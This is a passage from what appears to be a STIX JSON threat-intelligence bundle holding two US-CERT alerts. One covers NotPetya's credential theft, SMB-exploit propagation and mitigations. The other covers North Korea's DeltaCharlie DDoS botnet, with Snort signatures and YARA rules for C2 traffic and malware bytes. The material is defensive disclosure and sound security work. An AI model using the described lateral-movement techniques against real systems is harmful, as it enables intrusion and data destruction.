\t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\">[9] US-CERT: Ransomware and Recent Variants </a></li>\n            \t\t    \t<li><a href=\"https://blogs.technet.microsoft.com/mmpc/2017/06/29/windows-10-platform-resilience-against-the-petya-ransomware-attack/\">[10] Microsoft: Windows 10 platform resilience against the Petya ransomware attack</a></li>\n            \t\t    \t<li><a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11] Talos: New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide</a></li>\n            \t\t    \t<li><a href=\"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\">[12] Talos: The MeDoc Connection</a></li>\n            \t\t    \t<li><a href=\"https://www.dhs.gov/national-cybersecurity-and-communications-integration-center\">[13] NCCIC is the parent organization of US-CERT</a></li>\n            \t\t    \t<li><a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[14] New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide</a></li>\n            \t\t    \t<li><a href=\"https://blogs.technet.microsoft.com/msrc/2017/06/28/update-on-petya-malware-attacks/\">Microsoft:  Update on Petya Malware attacks</a></li>\n            \t\t    \t<li><a href=\"https://technet.microsoft.com/en-us/library/cc771551(v=ws.11).aspx\">Microsoft:  Authorize WMI users and set permissions</a></li>\n            \t\t    \t<li><a href=\"https://technet.microsoft.com/en-us/library/cc731011(v=ws.11).aspx\">Microsoft:  Managing WMI Security</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\">US-CERT Alert TA16-091A</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>July 1, 2017: Initial version</li>\n\t\t    \t\t\t    \t<li>July 3, 2017: Updated to include MIFR-10130295_stix.xml file. Substituted TA-17-181B_IOCs.csv for TA-17-181A_IOCs.csv.</li>\n\t\t    \t\t\t    \t<li>July 7, 2017: Included further guidance from Microsoft in the Reference Section</li>\n\t\t    \t\t\t    \t<li>July 28, 2017: Revised multiple sections based on additional analysis provided</li>\n\t\t    \t\t\t    \t<li>February 15, 2018: Added attribution of the NotPetya malware variant to the Russian military and link to White House press statement.</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "9106 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-181A",
					"source_name": "open source",
					"description": "Original release date: July 01, 2017 | Last revised: February 15, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Microsoft Windows operating systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p><em>This Alert has been updated to reflect the U.S. Government's public attribution of the \"NotPetya\" malware variant to the Russian military. Additional information may be found in a <a href=\"https://www.whitehouse.gov/briefings-statements/statement-press-secretary-25/\">Statement from the White House Press Secretary</a>.<em> For more information related to NotPetya activity, go to <a href=\"https://www.us-cert.gov/grizzlysteppe\">https://www.us-cert.gov/grizzlysteppe</a>.</em></em></p><p>The scope of this Alert’s analysis is limited to the newest Petya malware variant that surfaced on June 27, 2017. This malware is referred to as “NotPetya” throughout this Alert.</p><p>On June 27, 2017, NCCIC <a href=\"https://www.dhs.gov/national-cybersecurity-and-communications-integration-center\">[13]</a> was notified of Petya malware events occurring in multiple countries and affecting multiple sectors. This variant of the Petya malware—referred to as NotPetya—encrypts files with extensions from a hard-coded list. Additionally, if the malware gains administrator rights, it encrypts the master boot record (MBR), making the infected Windows computers unusable. NotPetya differs from previous Petya malware primarily in its propagation methods. </p><p>The NCCIC Code Analysis Team produced a Malware Initial Findings Report (MIFR) to provide in-depth technical analysis of the malware. In coordination with public and private sector partners, NCCIC is also providing additional indicators of compromise (IOCs) in comma-separated-value (CSV) form for information sharing purposes.</p><p>Available Files:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10130295.pdf\">MIFR-10130295.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10130295_stix.xml\">MIFR-10130295_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-181B_IOCs.csv\">TA-17-181B_IOCs.csv</a></li></ul>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>NotPetya leverages multiple propagation methods to spread within an infected network. According to malware analysis, NotPetya attempts the lateral movement techniques below:</p><ul><li>PsExec - a legitimate Windows administration tool</li><li>WMI - Windows Management Instrumentation, a legitimate Windows component</li><li>EternalBlue - the same Windows SMBv1 exploit used by WannaCry</li><li>EternalRomance - another Windows SMBv1 exploit</li></ul><p>Microsoft released a security update for the <a href=\"https://technet.microsoft.com/library/security/MS17-010\">MS17-010</a> SMB vulnerability on March 14, 2017, which addressed the EternalBlue and EternalRomance lateral movement techniques.</p><p><strong>Technical Details</strong></p><p>NCCIC received a sample of the NotPetya malware variant and performed a detailed analysis. Based on the analysis, NotPetya encrypts the victim’s files with a dynamically generated, 128-bit key and creates a unique ID of the victim. However, there is no evidence of a relationship between the encryption key and the victim’s ID, which means it may not be possible for the attacker to decrypt the victim’s files even if the ransom is paid. It behaves more like destructive malware rather than ransomware.</p><p>NCCIC observed multiple methods used by NotPetya to propagate across a network. The first and—in most cases—most effective method, uses a modified version of the Mimikatz tool to steal the user’s Windows credentials. The cyber threat actor can then use the stolen credentials, along with the native Windows Management Instrumentation Command Line (WMIC) tool or the Microsoft SysInternals utility, psexec.exe, to access other systems on the network. Another method for propagation uses the EternalBlue exploit tool to target unpatched systems running a vulnerable version of SMBv1. In this case, the malware attempts to identify other hosts on the network by checking the compromised system’s IP physical address mapping table. Next, it scans for other systems that are vulnerable to the SMB exploit and installs the malicious payload. Refer to the malware report, MIFR-10130295, for more details on these methods.</p><p>The analyzed sample of NotPetya encrypts the compromised system’s files with a 128-bit Advanced Encryption Standard (AES) algorithm during runtime. The malware then writes a text file on the “C:\\” drive that includes a static Bitcoin wallet location as well as unique personal installation key intended for the victim to use when making the ransom payment and the user’s Bitcoin wallet ID. NotPetya modifies the master boot record (MBR) to enable encryption of the master file table (MFT) and the original MBR, and then reboots the system. Based on the encryption methods used, it appears unlikely that the files could be restored, even if the attacker received the victim’s unique key and Bitcoin wallet ID.</p><p>The delivery mechanism of NotPetya during the June 27, 2017, event was determined to be the Ukrainian tax accounting software, M.E.Doc. The cyber threat actors used a backdoor to compromise M.E. Doc’s development environment as far back as April 14, 2017. This backdoor allowed the threat actor to run arbitrary commands, exfiltrate files, and download and execute arbitrary exploits on the affected system. Organizations should treat systems with M.E.Doc installed as suspicious, and should examine these systems for additional malicious activity. <a href=\"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\">[12]</a></p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>According to multiple reports, this NotPetya malware campaign has infected organizations in several sectors, including finance, transportation, energy, commercial facilities, and healthcare. While these victims are business entities, other Windows systems are also at risk, such as:</p><ul><li>those that do not have patches installed for the vulnerabilities in MS17‑010, CVE-2017-0144, and CVE-2017-0145, and</li><li>those who operate on the  shared network of affected organizations.</li></ul><p>Negative consequences of malware infection include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p>NCCIC recommends against paying ransoms; doing so enriches malicious actors while offering no guarantee that the encrypted files will be released. In this NotPetya incident, the email address for payment validation was shut down by the email provider, so payment is especially unlikely to lead to data recovery.<a href=\"https://www.bleepingcomputer.com/news/security/email-provider-shuts-down-petya-inbox-preventing-victims-from-recovering-files/\">[1]</a> According to one NCCIC stakeholder, the sites listed below sites are used for payment in this activity. These sites are not included in the CSV package as IOCs.</p><p>hxxp://mischapuk6hyrn72[.]onion/<br />hxxp://petya3jxfp2f7g3i[.]onion/<br />hxxp://petya3sen7dyko2n[.]onion/<br />hxxp://mischa5xyix2mrhd[.]onion/MZ2MMJ<br />hxxp://mischapuk6hyrn72[.]onion/MZ2MMJ<br />hxxp://petya3jxfp2f7g3i[.]onion/MZ2MMJ<br />hxxp://petya3sen7dyko2n[.]onion/MZ2MMJ</p><p><strong>Network Signatures</strong></p><p>NCCIC recommends that organizations coordinate with their security vendors to ensure appropriate coverage for this threat. Given the overlap of functionality and the similarity of behaviors between WannaCry and NotPetya, many of the available rulesets can protect against both malware types when appropriately implemented. The following rulesets provided in publically available sources may help detect activity associated with these malware types:</p><ul><li>sid:2001569, “ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection”<a href=\"http://doc.emergingthreats.net/2001569\">[2]</a></li><li>sid:2012063, “ET NETBIOS Microsoft SRV2.SYS SMB Negotiate ProcessID? Function Table Dereference (CVE-2009-3103)”<a href=\"http://doc.emergingthreats.net/bin/view/Main/2012063\">[3]</a></li><li>sid:2024297, “ET CURRENT_EVENTS ETERNALBLUE Exploit M2 MS17-010”<a href=\"http://docs.emergingthreats.net/bin/view/Main/2024297\">[4]</a></li><li>sid:42944,\"OS-WINDOWS Microsoft Windows SMB remote code execution attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li><li>sid:42340,\"OS-WINDOWS Microsoft Windows SMB anonymous session IPC share access attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li><li>sid:41984,\"OS-WINDOWS Microsoft Windows SMBv1 identical MID and FID type confusion attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li></ul><p><strong>Recommended Steps for Prevention</strong></p><p>Review US-CERT’s Alert on The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">[6]</a>, and consider implementing the following best practices:</p><ul><li>Ensure you have fully patched your systems, and confirm that you have applied Microsoft’s patch for the MS17-010 SMB vulnerability dated March 14, 2017.<a href=\"https://technet.microsoft.com/library/security/MS17-010\">[5]</a></li><li>Conduct regular backups of data and test your backups regularly as part of a comprehensive disaster recovery plan.</li><li>Ensure anti-virus and anti-malware solutions are set to automatically conduct regular scans.</li><li>Manage the use of privileged accounts. Implement the principle of least privilege. Do not assign administrative access to users unless absolutely needed. Those with a need for administrator accounts should only use them when necessary. </li><li>Configure access controls, including file, directory, and network share permissions with the principle of least privilege in mind. If a user only needs to read specific files, they should not have write access to those files, directories, or shares. </li><li>Secure use of WMI by authorizing WMI users and setting permissions.</li><li>Utilize host-based firewalls and block workstation-to-workstation communications to limit unnecessary lateral communications.</li><li>Disable or limit remote WMI and file sharing.</li><li>Block remote execution through PSEXEC.</li><li>Segregate networks and functions.</li><li>Harden network devices and secure access to infrastructure devices.</li><li>Perform out-of-band network management.</li><li>Validate integrity of hardware and software.</li><li>Disable SMBv1 and block all versions of SMB at the network boundary by blocking TCP port 445 with related protocols on UDP ports 137-138 and TCP port 139; this applies to all boundary devices.</li></ul><p><strong><em>Note:</em></strong><em> Disabling or blocking SMB may create problems by obstructing access to shared files, data, or devices. Weigh the benefits of mitigation against potential disruptions to users.</em></p><p><strong>Recommended Steps for Remediation</strong></p><ul><li>NCCIC strongly encourages organizations contact a local Federal Bureau of Investigation (FBI) field office upon discovery to report an intrusion and request assistance. Maintain and provide relevant logs.</li><li>Implement a security incident response and business continuity plan. Ideally, organizations should ensure they have appropriate backups so their response is simply to restore the data from a known clean backup. </li></ul><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov%20\">NCCICcustomerservice@hq.dhs.gov </a>or 888-282-0870. You can also report cyber crime incidents to the Internet Crime Complaint Center (IC3) at <a href=\"https://www.ic3.gov/default.aspx\">https://www.ic3.gov/default.aspx</a>.</p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://www.whitehouse.gov/briefings-statements/statement-press-secretary-25/\">Statement from the White House Press Secretary</a></li>\n            \t\t    \t<li><a href=\"https://www.bleepingcomputer.com/news/security/email-provider-shuts-down-petya-inbox-preventing-victims-from-recovering-files/\">[1] Bleeping Computer: Email Provider Shuts Down Petya Inbox Preventing Victims From Recovering Files</a></li>\n            \t\t    \t<li><a href=\"http://doc.emergingthreats.net/2001569\">[2] Emerging Threats 2001569</a></li>\n            \t\t    \t<li><a href=\"http://doc.emergingthreats.net/bin/view/Main/2012063\">[3] Emerging Threats 2012063</a></li>\n            \t\t    \t<li><a href=\"http://docs.emergingthreats.net/bin/view/Main/2024297\">[4] Emerging Threats 2024297</a></li>\n            \t\t    \t<li><a href=\"https://technet.microsoft.com/library/security/MS17-010\">[5] Microsoft: Security Bulletin MS17-010</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">[6] US-CERT: The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations</a></li>\n            \t\t    \t<li><a href=\"https://labsblog.f-secure.com/2017/06/30/eternal-petya-from-a-developers-perspective/\">[7] F-Secure: (Eternal) Petya from a Developer’s Perspective</a></li>\n            \t\t    \t<li><a href=\"https://blogs.technet.microsoft.com/mmpc/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/\">[8] Microsoft |TechNet: New ransomware, old techniques: Petya adds worm capabilities </a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\">[9] US-CERT: Ransomware and Recent Variants </a></li>\n            \t\t    \t<li><a href=\"https://blogs.technet.microsoft.com/mmpc/2017/06/29/windows-10-platform-resilience-against-the-petya-ransomware-attack/\">[10] Microsoft: Windows 10 platform resilience against the Petya ransomware attack</a></li>\n            \t\t    \t<li><a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11] Talos: New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide</a></li>\n            \t\t    \t<li><a href=\"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\">[12] Talos: The MeDoc Connection</a></li>\n            \t\t    \t<li><a href=\"https://www.dhs.gov/national-cybersecurity-and-communications-integration-center\">[13] NCCIC is the parent organization of US-CERT</a></li>\n            \t\t    \t<li><a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[14] New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide</a></li>\n            \t\t    \t<li><a href=\"https://blogs.technet.microsoft.com/msrc/2017/06/28/update-on-petya-malware-attacks/\">Microsoft:  Update on Petya Malware attacks</a></li>\n            \t\t    \t<li><a href=\"https://technet.microsoft.com/en-us/library/cc771551(v=ws.11).aspx\">Microsoft:  Authorize WMI users and set permissions</a></li>\n            \t\t    \t<li><a href=\"https://technet.microsoft.com/en-us/library/cc731011(v=ws.11).aspx\">Microsoft:  Managing WMI Security</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\">US-CERT Alert TA16-091A</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>July 1, 2017: Initial version</li>\n\t\t    \t\t\t    \t<li>July 3, 2017: Updated to include MIFR-10130295_stix.xml file. Substituted TA-17-181B_IOCs.csv for TA-17-181A_IOCs.csv.</li>\n\t\t    \t\t\t    \t<li>July 7, 2017: Included further guidance from Microsoft in the Reference Section</li>\n\t\t    \t\t\t    \t<li>July 28, 2017: Revised multiple sections based on additional analysis provided</li>\n\t\t    \t\t\t    \t<li>February 15, 2018: Added attribution of the NotPetya malware variant to the Russian military and link to White House press statement.</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-07-01T05:41:37.000Z"
		},
		{
			"type": "report",
			"title": "TA17-164A: HIDDEN COBRA – North Korea’s DDoS Botnet Infrastructure",
			"name": "TA17-164A: HIDDEN COBRA – North Korea’s DDoS Botnet Infrastructure",
			"id": "report--bf48269b-cbcb-4fc8-bdf4-a903bdf7dbb6",
			"description": "Original release date: June 13, 2017 | Last revised: August 23, 2017<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Networked Systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides technical details on the tools and infrastructure used by cyber actors of the North Korean government to target the media, aerospace, financial, and critical infrastructure sectors in the United States and globally. Working with U.S. Government partners, DHS and FBI identified Internet Protocol (IP) addresses associated with a malware variant, known as DeltaCharlie, used to manage North Korea’s distributed denial-of-service (DDoS) botnet infrastructure. This alert contains indicators of compromise (IOCs), malware descriptions, network signatures, and host-based rules to help network defenders detect activity conducted by the North Korean government. The U.S. Government refers to the malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information related to HIDDEN COBRA activity, go to <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>If users or administrators detect the custom tools indicative of HIDDEN COBRA, these tools should be immediately flagged, reported to the DHS National Cybersecurity Communications and Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and given highest priority for enhanced mitigation. This alert identifies IP addresses linked to systems infected with DeltaCharlie malware and provides descriptions of the malware and associated malware signatures. DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network. FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.</p><p>This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S. Government.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-164A_csv.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-164A_stix.xml\">.stix</a>)</li></ul><p>On August 23, 2017, DHS published a Malware Analysis Report (MAR-10132963) that examines malware functionality to provide detailed code analysis and insight into specific tactics, techniques, and procedures (TTPs) observed in the malware.</p><p>For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963.pdf\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963_stix.xml\">.stix</a>)</li></ul>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Since 2009, HIDDEN COBRA actors have leveraged their capabilities to target and compromise a range of victims; some intrusions have resulted in the exfiltration of data while others have been disruptive in nature. Commercial reporting has referred to this activity as Lazarus Group<a href=\"https://exchange.xforce.ibmcloud.com/collection/Actor-Lazarus-Group-0bf5e50d24445f94d6b2d744dc6c63a2\">[1]</a> and Guardians of Peace.<a href=\"https://www.alienvault.com/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks\">[2]</a> DHS and FBI assess that HIDDEN COBRA actors will continue to use cyber operations to advance their government’s military and strategic objectives. Cyber analysts are encouraged to review the information provided in this alert to detect signs of malicious network activity.</p><p>Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware. Variants of malware and tools used by HIDDEN COBRA actors include Destover,<a href=\"https://www.symantec.com/connect/blogs/destover-destructive-malware-has-links-attacks-south-korea\">[3]</a> Wild Positron/Duuzer,<a href=\"https://www.symantec.com/connect/blogs/duuzer-back-door-trojan-targets-south-korea-take-over-computers\">[4]</a> and Hangman.<a href=\"https://www.fireeye.com/blog/threat-research/2015/09/zero-day_hwp_exploit.html\">[5]</a> DHS has previously released Alert TA14-353A,<a href=\"https://www.us-cert.gov/ncas/alerts/TA14-353A\">[6]</a> which contains additional details on the use of a server message block (SMB) worm tool employed by these actors. Further research is needed to understand the full breadth of this group’s cyber capabilities. In particular, DHS recommends that more research should be conducted on the North Korean cyber activity that has been reported by cybersecurity and threat research firms.</p><p>HIDDEN COBRA actors commonly target systems running older, unsupported versions of Microsoft operating systems. The multiple vulnerabilities in these older systems provide cyber actors many targets for exploitation. These actors have also used Adobe Flash player vulnerabilities to gain initial entry into users’ environments.</p><p>HIDDEN COBRA is known to use vulnerabilities affecting various applications. These vulnerabilities include:</p><ul><li>CVE-2015-6585: Hangul Word Processor Vulnerability</li><li>CVE-2015-8651: Adobe Flash Player 18.0.0.324 and 19.x Vulnerability</li><li>CVE-2016-0034: Microsoft Silverlight 5.1.41212.0 Vulnerability</li><li>CVE-2016-1019: Adobe Flash Player 21.0.0.197 Vulnerability</li><li>CVE-2016-4117: Adobe Flash Player 21.0.0.226 Vulnerability</li></ul><p>DHS recommends that organizations upgrade these applications to the latest version and patch level. If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.</p><p>The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie. The DeltaCharlie DDoS bot was originally reported by Novetta in their 2016 Operation Blockbuster Malware Report.<a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">[7]</a> This malware has used the IP addresses identified in the accompanying .csv and .stix files as both source and destination IPs. In some instances, the malware may have been present on victims’ networks for a significant period.</p><p><strong><em>Technical Details</em></strong></p><p>DeltaCharlie is a DDoS tool used by HIDDEN COBRA actors, and is referenced and detailed in Novetta’s Operation Blockbuster Destructive Malware report. The information related to DeltaCharlie from the Operation Blockbuster Destructive Malware report should be viewed in conjunction with the IP addresses listed in the .csv and .stix files provided within this alert. DeltaCharlie is a DDoS tool capable of launching Domain Name System (DNS) attacks, Network Time Protocol (NTP) attacks, and Carrier Grade NAT (CGN) attacks. The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks. Further details on the malware can be found in Novetta’s report available at the following URL:</p><p><a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf</a></p><p><strong><em>Detection and Response</em></strong></p><p>HIDDEN COBRA IOCs related to DeltaCharlie are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find that some traffic corresponds to malicious activity and some to legitimate activity. System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors. Additionally, the appendices of this report provide network signatures to aid in the detection and mitigation of HIDDEN COBRA activity.</p><p><strong><em>Network Signatures and Host-Based Rules</em></strong></p><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><p><strong><em>Network Signatures</em></strong></p><p>alert tcp any any -&gt; any any (msg:\"DPRK_HIDDEN_COBRA_DDoS_HANDSHAKE_SUCCESS\"; dsize:6; flow:established,to_server; content:\"|18 17 e9 e9 e9 e9|\"; fast_pattern:only; sid:1; rev:1;)</p><p>________________________________________________________________</p><p>alert tcp any any -&gt; any any (msg:\"DPRK_HIDDEN_COBRA_Botnet_C2_Host_Beacon\"; flow:established,to_server; content:\"|1b 17 e9 e9 e9 e9|\"; depth:6; fast_pattern; sid:1; rev:1;)</p><p>________________________________________________________________</p><p><strong><em>YARA Rules</em></strong></p><p>{</p><p>meta:</p><p>description = “RSA Key”</p><p>strings:</p><p>$rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94</p><p>A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77</p><p>48 EE 6F 4B 9B 53 60 98 45 A5 28 65 8A 0B F8 39</p><p>73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2</p><p>AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED</p><p>39 3F FA D0 AD 3D D9 C5 3D 28 EF 3D 67 B1 E0 68</p><p>3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13</p><p>B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}</p><p>condition:</p><p>any of them</p><p>}</p><p>________________________________________________________________</p><p>{</p><p>meta:</p><p>description = “DDoS Misspelled Strings”</p><p>strings:</p><p>$STR1 = \"Wating\" wide ascii</p><p>$STR2 = \"Reamin\" wide ascii</p><p>$STR3 = \"laptos\" wide ascii</p><p>condition:</p><p>(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them</p><p>}</p><p>________________________________________________________________</p><p>{</p><p>meta:</p><p>description = “DDoS Random URL Builder”</p><p>strings:</p><p>$randomUrlBuilder = { 83 EC 48 53 55 56 57 8B 3D ?? ?? ?? ?? 33 C0 C7 44 24 28 B4 6F 41 00 C7 44 24 2C B0 6F 41 00 C7 44 24 30 AC 6F 41 00 C7 44 24 34 A8 6F 41 00 C7 44 24 38 A4 6F 41 00 C7 44 24 3C A0 6F 41 00 C7 44 24 40 9C 6F 41 00 C7 44 24 44 94 6F 41 00 C7 44 24 48 8C 6F 41 00 C7 44 24 4C 88 6F 41 00 C7 44 24 50 80 6F 41 00 89 44 24 54 C7 44 24 10 7C 6F 41 00 C7 44 24 14 78 6F 41 00 C7 44 24 18 74 6F 41 00 C7 44 24 1C 70 6F 41 00 C7 44 24 20 6C 6F 41 00 89 44 24 24 FF D7 99 B9 0B 00 00 00 F7 F9 8B 74 94 28 BA 9C 6F 41 00 66 8B 06 66 3B 02 74 34 8B FE 83 C9 FF 33 C0 8B 54 24 60 F2 AE 8B 6C 24 5C A1 ?? ?? ?? ?? F7 D1 49 89 45 00 8B FE 33 C0 8D 5C 11 05 83 C9 FF 03 DD F2 AE F7 D1 49 8B FE 8B D1 EB 78 FF D7 99 B9 05 00 00 00 8B 6C 24 5C F7 F9 83 C9 FF 33 C0 8B 74 94 10 8B 54 24 60 8B FE F2 AE F7 D1 49 BF 60 6F 41 00 8B D9 83 C9 FF F2 AE F7 D1 8B C2 49 03 C3 8B FE 8D 5C 01 05 8B 0D ?? ?? ?? ?? 89 4D 00 83 C9 FF 33 C0 03 DD F2 AE F7 D1 49 8D 7C 2A 05 8B D1 C1 E9 02 F3 A5 8B CA 83 E1 03 F3 A4 BF 60 6F 41 00 83 C9 FF F2 AE F7 D1 49 BE 60 6F 41 00 8B D1 8B FE 83 C9 FF 33 C0 F2 AE F7 D1 49 8B FB 2B F9 8B CA 8B C1 C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 7C 24 60 8D 75 04 57 56 E8 ?? ?? ?? ?? 83 C4 08 C6 04 3E 2E 8B C5 C6 03 00 5F 5E 5D 5B 83 C4 48 C3 }</p><p>condition:</p><p>$randomUrlBuilder</p><div><div id=\"ftn1\"><div><div id=\"ftn1\"><p>}</p><p>________________________________________________________________</p></div><div id=\"ftn2\"> </div></div></div></div>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p><strong><em>Mitigation Strategies</em></strong></p><p>Network administrators are encouraged to apply the following recommendations, which can prevent as many as 85 percent of targeted cyber intrusions. The mitigation strategies provided may seem like common sense. However, many organizations fail to use these basic security measures, leaving their systems open to compromise:</p><ol><li><strong>Patch applications and operating systems</strong> – Most attackers target vulnerable applications and operating systems. Ensuring that applications and operating systems are patched with the latest updates greatly reduces the number of exploitable entry points available to an attacker. Use best practices when updating software and patches by only downloading updates from authenticated vendor sites.</li><li><strong>Use application whitelisting</strong> – Whitelisting is one of the best security strategies because it allows only specified programs to run while blocking all others, including malicious software.</li><li><strong>Restrict administrative privileges</strong> – Threat actors are increasingly focused on gaining control of legitimate credentials, especially credentials associated with highly privileged accounts. Reduce privileges to only those needed for a user’s duties. Separate administrators into privilege tiers with limited access to other tiers.</li><li><strong>Segment networks and segregate them into security zones</strong> – Segment networks into logical enclaves and restrict host-to-host communications paths. This helps protect sensitive information and critical services, and limits damage from network perimeter breaches.</li><li><strong>Validate input</strong> – Input validation is a method of sanitizing untrusted input provided by users of a web application. Implementing input validation can protect against the security flaws of web applications by significantly reducing the probability of successful exploitation. Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.</li><li><strong>Use stringent file reputation settings</strong> – Tune the file reputation systems of your anti-virus software to the most aggressive setting possible. Some anti-virus products can limit execution to only the highest reputation files, stopping a wide range of untrustworthy code from gaining 